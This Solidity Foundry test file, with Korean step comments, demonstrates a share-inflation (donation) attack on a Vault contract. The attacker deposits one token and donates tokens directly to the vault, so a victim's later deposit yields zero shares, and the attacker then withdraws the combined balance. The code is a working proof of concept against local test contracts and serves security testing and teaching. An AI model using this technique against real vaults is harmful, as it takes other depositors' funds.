// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.33;

import {Test, console} from "forge-std/Test.sol";
import {Token} from "./Token.sol";
import {Vault} from "@src/Vault.sol";

/*
forge test --match-path Vault.t.sol -vvv
*/

contract VaultTest is Test {
    Token token;
    Vault vault;

    address[] public users = [address(1), address(2)];

    function setUp() public {
        token = new Token("test", "TEST", 18);
        vault = new Vault(address(token), 3);

        for (uint256 i = 0; i < users.length; i++) {
            token.mint(users[i], 100 * 1e18);
            vm.prank(users[i]);
            token.approve(address(vault), type(uint256).max);
        }
    }

    function test_inflation_attack() public {
        // 1. 공격자가 토큰 1개 예치 -> 지분 1개 수령
        // 2. 공격자가 토큰 X개 기부
        // 3. 사용자가 토큰 X개 예치 -> 지분 X * 1 / (X + 1) = 0개 수령
        // 4. 공격자가 지분 1개 인출 -> 토큰 X + (X + 1)개 수령

        // 1
        vm.prank(users[0]);
        uint256 s0 = vault.deposit(1);
        console.log("attacker shares: %e", s0);

        // 2
        uint256 amt = 1e18;
        vm.prank(users[0]);
        token.transfer(address(vault), amt);
        console.log("attacker donate: %e", amt);

        // 3
        vm.prank(users[1]);
        uint256 s1 = vault.deposit(amt);
        console.log("user deposit: %e", amt);
        console.log("user shares: %e", s1);

        // 4
        vm.prank(users[0]);
        uint256 w0 = vault.withdraw(s0);
        console.log("attacker received: %e", w0);

        vm.prank(users[1]);
        uint256 w1 = vault.withdraw(s1);
        console.log("user received: %e", w1);

        console.log("vault balance: %e", token.balanceOf(address(vault)));
    }
}
